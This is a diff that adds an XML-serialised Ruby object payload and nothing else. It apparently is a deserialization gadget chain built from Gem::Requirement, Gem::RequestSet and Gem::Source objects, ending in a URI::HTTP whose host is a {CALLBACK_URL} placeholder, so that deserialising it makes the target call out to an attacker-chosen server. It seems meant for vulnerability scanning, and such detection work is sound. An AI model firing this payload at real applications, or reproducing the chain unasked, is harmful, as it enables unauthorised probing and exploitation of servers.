@@ -1,0 +1,34 @@
+<h>
+    <a>
+    <c c="Gem::SpecFetcher"></c>
+    <o c="Gem::Requirement">
+        <a a="@requirements">
+        <a>
+            <s>~&gt;</s>
+            <o c="Gem::RequestSet::Lockfile">
+            <o a="@set" c="Gem::RequestSet">
+                <a a="@sorted_requests">
+                <o c="Gem::Resolver::IndexSpecification">
+                    <s a="@name">name</s>
+                    <o a="@source" c="Gem::Source">
+                    <o a="@uri" c="URI::HTTP">
+                        <s a="@path">/</s>
+                        <s a="@scheme">s3</s>
+                        <s a="@host">{CALLBACK_URL}?</s>
+                        <s a="@port">any</s>
+                        <s a="@user">any</s>
+                        <s a="@password">any</s>
+                    </o>
+                    <y a="@update_cache"></y>
+                    </o>
+                </o>
+                </a>
+            </o>
+            <a a="@dependencies"></a>
+            </o>
+        </a>
+        </a>
+    </o>
+    </a>
+    <s>any</s>
+</h>
